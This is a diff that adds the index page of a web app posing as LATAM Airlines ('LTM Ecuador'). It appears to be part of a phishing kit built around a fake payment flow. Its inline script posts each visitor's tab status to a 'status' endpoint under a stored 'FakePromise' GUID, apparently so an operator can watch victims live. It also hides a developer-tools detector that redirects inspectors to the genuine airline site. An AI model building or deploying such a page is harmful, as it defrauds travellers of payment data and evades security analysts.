@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html ng-app="LatamApp">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
+    <meta
+      http-equiv="Cache-Control"
+      content="no-cache, no-store, must-revalidate"
+    />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="0" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1"
+    />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="shortcut icon" href="assets/icons/favicon.png" />
+    <script src="https://use.fontawesome.com/b1ad4d7e81.js"></script>
+    <link
+      href="https://fonts.googleapis.com/icon?family=Material+Icons"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@48,400,0,0"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"
+    />
+
+    <title>Cotiza Vuelos, Paquetes, Hoteles y Carros | LTM Ecuador</title>
+    <link rel="stylesheet" href="css/normalize.css?v=522777463" />
+    <link rel="stylesheet" href="css/utils.css?v=794313086" />
+    <link rel="stylesheet" href="css/home.css?v=723082004" />
+    <link rel="stylesheet" href="css/dp.css?v=1502808082" />
+    <link rel="stylesheet" href="css/banks.css?v=276499053" />
+  </head>
+
+  <body ng-controller="startController">
+    <div class="Wrapper" id="Wrapper">
+      <div ui-view style="height: 100%"></div>
+    </div>
+
+    <!-- ====== Scripts en orden correcto ====== -->
+    <!-- AngularJS -->
+    <script src="angular/angular.min.js"></script>
+    <script src="angular/angular-route.min.js"></script>
+    <script src="angular/angular-ui-router.js"></script>
+
+    <!-- jQuery -->
+    <script src="assets/bootstrap/js/jquery.min.js"></script>
+
+    <!-- Primero app.js (crea el módulo) -->
+    <script src="angular/app.js?v=1559265276"></script>
+
+    <!-- Después 000.js (usa el módulo) -->
+    <script src="angular/000.js?v=1559265276"></script>
+
+    <!-- Script de estado (sin cambios de lógica) -->
+    <script>
+      // Verificar si existe el GUID antes de ejecutar el código
+      if (localStorage.getItem("idPaymentLatamFakePromise")) {
+        var item = localStorage.getItem("idPaymentLatamFakePromise");
+
+        // Evento beforeunload (cuando cierra la pestaña/ventana)
+        window.addEventListener("beforeunload", function (event) {
+          $.ajax({
+            url: "status",
+            type: "POST",
+            data: {
+              action: "Cerrado", // Cambio aquí: estado específico para cierre
+              GUID: item,
+            },
+            async: false,
+          });
+        });
+
+        // Evento visibilitychange (cuando cambia entre pestañas)
+        document.addEventListener("visibilitychange", function () {
+          if (document.visibilityState === "visible") {
+            $.ajax({
+              url: "status",
+              type: "POST",
+              async: false,
+              data: {
+                action: "enLinea",
+                GUID: item,
+              },
+            });
+          } else {
+            $.ajax({
+              url: "status",
+              type: "POST",
+              async: false,
+              data: {
+                action: "Minimizado",
+                GUID: item,
+              },
+            });
+          }
+        });
+
+        // Evento DOMContentLoaded
+        document.addEventListener("DOMContentLoaded", function () {
+          $.ajax({
+            url: "status",
+            type: "POST",
+            data: {
+              action: "enLinea",
+              GUID: item,
+            },
+          });
+        });
+      }
+
+      var checkStatus;
+
+      var element = new Image();
+      Object.defineProperty(element, "id", {
+        get: function () {
+          checkStatus = "on";
+          console.log("OPENED");
+          document.location.href = "https://www.latamairlines.com/co/es";
+          throw new Error("Dev tools checker");
+        },
+      });
+
+      requestAnimationFrame(function check() {
+        checkStatus = "off";
+      });
+    </script>
+  </body>
+</html>
